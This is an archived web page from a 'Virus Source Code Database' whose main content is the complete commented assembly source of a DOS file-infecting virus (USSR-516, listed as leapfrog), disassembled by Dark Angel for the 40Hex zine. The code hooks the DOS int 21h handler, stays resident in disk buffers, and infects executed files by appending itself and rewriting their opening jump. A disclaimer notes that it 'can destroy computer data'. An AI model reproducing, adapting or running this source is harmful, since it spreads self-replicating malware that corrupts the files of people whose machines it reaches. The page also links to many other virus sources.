<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: leapfrog_asm</title>
<meta name="KEYWORDS" content="leapfrog.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for leapfrog.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="lamark_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lamark_asm.php">lamark_asm</a><br>
<a href="lct_599_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lct_599_asm.php">lct_599_asm</a><br>
<a href="lct-599_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lct-599_asm.php">lct-599_asm</a><br>
<a href="lct_762_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lct_762_asm.php">lct_762_asm</a><br>
<a href="lct-762_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lct-762_asm.php">lct-762_asm</a><br>
<a href="leap-fro_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leap-fro_asm.php">leap-fro_asm</a><br>
<a href="leapfrog_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leapfrog_asm.php">leapfrog_asm</a><br>
<a href="leech__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leech__asm.php">leech__asm</a><br>
<a href="leech_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leech_asm.php">leech_asm</a><br>
<a href="lehi_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lehi_asm.php">lehi_asm</a><br>
<a href="lehigh___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lehigh___asm.php">lehigh___asm</a><br>
<a href="lehigh__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lehigh__asm.php">lehigh__asm</a><br>
<a href="lehigh_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lehigh_asm.php">lehigh_asm</a><br>
<a href="lep-664a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lep-664a_asm.php">lep-664a_asm</a><br>
<a href="lepmisry_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lepmisry_asm.php">lepmisry_asm</a><br>
<a href="leprosb2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leprosb2_asm.php">leprosb2_asm</a><br>
<a href="leprosy_2_c.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leprosy_2_c.php">leprosy_2_c</a><br>
<a href="leprosy_3_c.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leprosy_3_c.php">leprosy_3_c</a><br>
<a href="leprosy__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leprosy__asm.php">leprosy__asm</a><br>
<a href="leprosyb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leprosyb_asm.php">leprosyb_asm</a><br>
<a href="leprosy_c.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leprosy_c.php">leprosy_c</a><br>
<a href="leprosyc_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leprosyc_asm.php">leprosyc_asm</a><br>
<a href="leprsyb1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leprsyb1_asm.php">leprsyb1_asm</a><br>
<a href="leprsyb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leprsyb_asm.php">leprsyb_asm</a><br>
<a href="leps808d_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leps808d_asm.php">leps808d_asm</a><br>
<a href="leszop_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leszop_asm.php">leszop_asm</a><br>
<a href="libertyb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/libertyb_asm.php">libertyb_asm</a><br>
<a href="lisa__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lisa__asm.php">lisa__asm</a><br>
<a href="lisa_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lisa_asm.php">lisa_asm</a><br>
<a href="lisbon2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lisbon2_asm.php">lisbon2_asm</a><br>
<a href="lit_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lit_asm.php">lit_asm</a><br>
<a href="littl139_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/littl139_asm.php">littl139_asm</a><br>
<a href="little__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/little__asm.php">little__asm</a><br>
<a href="load_sec_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/load_sec_asm.php">load_sec_asm</a><br>
<a href="lock2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lock2_asm.php">lock2_asm</a><br>
<a href="lock_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lock_asm.php">lock_asm</a><br>
<a href="lockjaw__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lockjaw__asm.php">lockjaw__asm</a><br>
<a href="lockjaw_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lockjaw_asm.php">lockjaw_asm</a><br>
<a href="lockout2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lockout2_asm.php">lockout2_asm</a><br>
<a href="lockout_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lockout_asm.php">lockout_asm</a><br>
<a href="loki1237_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/loki1237_asm.php">loki1237_asm</a><br>
<a href="loki_973_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/loki_973_asm.php">loki_973_asm</a><br>
<a href="loki-973_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/loki-973_asm.php">loki-973_asm</a><br>
<a href="lokjawd_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lokjawd_asm.php">lokjawd_asm</a><br>
<a href="lokjawz_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lokjawz_asm.php">lokjawz_asm</a><br>
<a href="lordzero_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lordzero_asm.php">lordzero_asm</a><br>
<a href="lqcancer_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lqcancer_asm.php">lqcancer_asm</a><br>
<a href="ltbro299_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/ltbro299_asm.php">ltbro299_asm</a><br>
<a href="ltbro307_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/ltbro307_asm.php">ltbro307_asm</a><br>
<a href="ltbro321_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/ltbro321_asm.php">ltbro321_asm</a><br>
<a href="ltbrt299_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/ltbrt299_asm.php">ltbrt299_asm</a><br>
<a href="lythyum_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lythyum_asm.php">lythyum_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/g/index.php  \n\nThis file was not retrieved by Teleport Pro, because it was unavailable, or its retrieval was aborted, or the project was stopped too soon.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/g/index.php'" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

.model tiny
.code

ussr516         segment byte public
                assume  cs:ussr516, ds:ussr516
                org     100h
; Disassembled by Dark Angel of PHALCON/SKISM
; for 40Hex Number 7 Volume 2 Issue 3
stub:           db      0e9h, 0, 0
                db      0e9h, 1, 0, 0
; This is where the virus really begins
start:
                push    ax
                call    beginvir

orig4           db      0cdh, 20h, 0, 0
int30store      db      0, 0, 0, 0                     ; Actually it's int 21h
                                                       ; entry point
int21store      db      0, 0, 0, 0

beginvir:       pop     bp                             ; BP -> orig4
                mov     si,bp
                mov     di,103h
                add     di,[di-2]                      ; DI -> orig4
                movsw                                  ; restore original
                movsw                                  ; 4 bytes of program
                xor     si,si
                mov     ds,si
                les     di,dword ptr ds:[21h*4]
                mov     [bp+8],di                      ; int21store
                mov     [bp+0Ah],es
                lds     di,dword ptr ds:[30h*4+1]      ; Bug????
findmarker:
                inc     di
                cmp     word ptr [di-2],0E18Ah         ; Find marker bytes
                jne     findmarker                     ; to the entry point
                mov     [bp+4],di                      ; and move to
                mov     [bp+6],ds                      ; int30store
                mov     ax,5252h                       ; Get list of lists
                int     21h                            ; and also ID check

                add     bx,12h                         ; Already installed?
                jz      quitvir                        ; then exit
                push    bx
                mov     ah,30h                         ; Get DOS version
                int     21h

                pop     bx                             ; bx = 12, ptr to 1st
                                                       ; disk buffer
                cmp     al,3
                je      handlebuffer                   ; if DOS 3
                ja      handleDBHCH                    ; if > DOS 3
                inc     bx                             ; DOS 2.X, offset is 13
handlebuffer:
                push    ds
                push    bx
                lds     bx,dword ptr [bx]              ; Get seg:off of buffer
                inc     si
                pop     di
                pop     es                             ; ES:DI->seg:off buff
                mov     ax,[bx]                        ; ptr to next buffer
                cmp     ax,0FFFFh                      ; least recently used?
                jne     handlebuffer                   ; if not, go find it
                cmp     si,3
                jbe     quitvir
                stosw
                stosw
                jmp     short movetobuffer
handleDBHCH:   ; Disk Buffer Hash Chain Head array
                lds     si,dword ptr [bx]              ; ptr to disk buffer
                lodsw                                  ; info
                lodsw                                  ; seg of disk buffer
                                                       ; hash chain head array
                inc     ax                             ; second entry
                mov     ds,ax
                xor     bx,bx
                mov     si,bx
                lodsw                                  ; EMS page, -1 if not
                                                       ; in EMS
                xchg    ax,di                          ; save in di
                lodsw                                  ; ptr to least recently
                                                       ; used buffer
                mov     [di+2],ax                      ; change disk buffer
                                                       ; backward offset to
                                                       ; least recently used
                xchg    ax,di                          ; restore EMS page
                mov     [di],ax                        ; set to least recently
movetobuffer:                                          ; used
                mov     di,bx
                push    ds
                pop     es                             ; ES:DI -> disk buffer
                push    cs
                pop     ds
                mov     cx,108h
                lea     si,[bp-4]                      ; Copy from start
                rep     movsw
                mov     ds,cx                          ; DS -> interrupt table
                mov     word ptr ds:[4*21h],0BCh       ; New interrupt handler
                mov     word ptr ds:[4*21h+2],es       ; at int21
quitvir:
                push    cs                             ; CS = DS = ES
                pop     es
                push    es
                pop     ds
                pop     ax
                mov     bx,ax
                mov     si, 100h                       ; set up stack for
                push    si                             ; the return to the
                retn                                   ; original program
int24:
                mov     al,3                           ; Ignore all errors
                iret
tickstore       db      3                              ; Why???
buffer          db      3, 0, 9, 0

int21:
                pushf
                cli                                    ; CP/M style call entry
                call    dword ptr cs:[int30store-start]
                retn                                   ; point of int 21h

int21DSDX:                                             ; For int 21h calls
                push    ds                             ; with
                lds     dx,dword ptr [bp+2]            ; DS:DX -> filename
                call    int21
                pop     ds
                retn

                cmp     ax,4B00h                       ; Execute
                je      Execute
                cmp     ax,5252h                       ; ID check
                je      CheckID
                cmp     ah,30h                         ; DOS Version
                je      DosVersion
callorig21:                                            ; Do other calls
                jmp     dword ptr cs:[int21store-start]
DosVersion:    ; Why?????                             ; DOS Version
                dec     byte ptr cs:[tickstore-start]
                jnz     callorig21                     ; Continue if not 0
                push    es
                xor     ax,ax
                push    ax
                mov     es,ax
                mov     al,es:[46Ch]                   ; 40h:6Ch = Timer ticks
                                                       ; since midnight
                and     al,7                           ; MOD 15
                inc     ax
                inc     ax
                mov     cs:[tickstore-start],al        ; # 2-17
                pop     ax
                pop     es
                iret
CheckID:                                               ; ID Check
                mov     bx,0FFEEh                      ; FFEEh = -12h
                iret
Execute:                                               ; Execute
                push    ax                             ; Save registers
                push    cx
                push    es
                push    bx
                push    ds                             ; DS:DX -> filename
                push    dx                             ; save it on stack
                push    bp
                mov     bp,sp                          ; Set up stack frame
                sub     sp,0Ah                         ; Temporary variables
                                                       ; [bp-A] = attributes
                                                       ; [bp-8] = int 24 off
                                                       ; [bp-6] = int 24 seg
                                                       ; [bp-4] = file time
                                                       ; [bp-2] = file date
                sti
                push    cs
                pop     ds
                mov     ax,3301h                       ; Turn off ^C check
                xor     dl,dl                          ; (never turn it back
                call    int21                          ;  on.  Bug???)
                mov     ax,3524h                       ; Get int 24h
                call    int21                          ; (Critical error)
                mov     [bp-8],bx
                mov     [bp-6],es
                mov     dx,int24-start
                mov     ax,2524h                       ; Set to new one
                call    int21
                mov     ax,4300h                       ; Get attributes
                call    int21DSDX
                jnc     continue
doneinfect:
                mov     ax,2524h                       ; Restore crit error
                lds     dx,dword ptr [bp-8]            ; handler
                call    int21
                cli
                mov     sp,bp
                pop     bp
                pop     dx
                pop     ds
                pop     bx
                pop     es
                pop     cx
                pop     ax
                jmp     short callorig21               ; Call orig handler
continue:
                mov     [bp-0Ah],cx                    ; Save attributes
                test    cl,1                           ; Check if r/o????
                jz      noclearattr
                xor     cx,cx
                mov     ax,4301h                       ; Clear attributes
                call    int21DSDX                      ; Filename in DS:DX
                jc      doneinfect                     ; Quit on error
noclearattr:
                mov     ax,3D02h                       ; Open read/write
                call    int21DSDX                      ; Filename in DS:DX
                jc      doneinfect                     ; Exit if error
                mov     bx,ax
                mov     ax,5700h                       ; Save time/date
                call    int21
                mov     [bp-4],cx
                mov     [bp-2],dx
                mov     dx,buffer-start
                mov     cx,4
                mov     ah,3Fh                         ; Read 4 bytes to
                call    int21                          ; buffer
                jc      quitinf
                cmp     byte ptr ds:[buffer-start],0E9h; Must start with 0E9h
                jne     quitinf                        ; Otherwise, quit
                mov     dx,word ptr ds:[buffer+1-start]; dx = jmploc
                dec     dx
                xor     cx,cx
                mov     ax,4201h                       ; go there
                call    int21
                mov     ds:[buffer-start],ax           ; new location offset
                mov     dx,orig4-start
                mov     cx,4
                mov     ah,3Fh                         ; Read 4 bytes there
                call    int21
                mov     dx,ds:[orig4-start]
                cmp     dl,0E9h                        ; 0E9h means we might
                jne     infect                         ; already be there
                mov     ax,ds:[orig4+2-start]          ; continue checking
                add     al,dh                          ; to see if we really
                sub     al,ah                          ; are there.
                jz      quitinf
infect:
                xor     cx,cx
                mov     dx,cx
                mov     ax,4202h                       ; Go to EOF
                call    int21
                mov     ds:[buffer+2-start],ax         ; save filesize
                mov     cx,204h
                mov     ah,40h                         ; Write virus
                call    int21
                jc      quitinf                        ; Exit if error
                sub     cx,ax
                jnz     quitinf
                mov     dx,ds:[buffer-start]
                mov     ax,ds:[buffer+2-start]
                sub     ax,dx
                sub     ax,3                           ; AX->jmp offset
                mov     word ptr ds:[buffer+1-start],ax; Set up buffer
                mov     byte ptr ds:[buffer-start],0E9h; code the jmp
                add     al,ah
                mov     byte ptr ds:[buffer+3-start],al
                mov     ax,4200h                       ; Rewind to jmploc
                call    int21
                mov     dx, buffer-start
                mov     cx,4                           ; Write in the jmp
                mov     ah,40h
                call    int21
quitinf:
                mov     cx,[bp-4]
                mov     dx,[bp-2]
                mov     ax,5701h                       ; Restore date/time
                call    int21
                mov     ah,3Eh                         ; Close file
                call    int21
                mov     cx,[bp-0Ah]                    ; Restore attributes
                mov     ax,4301h
                call    int21DSDX
                jmp     doneinfect                     ; Return
ussr516         ends
                end     stub

</textarea></td></tr></table></body></html>
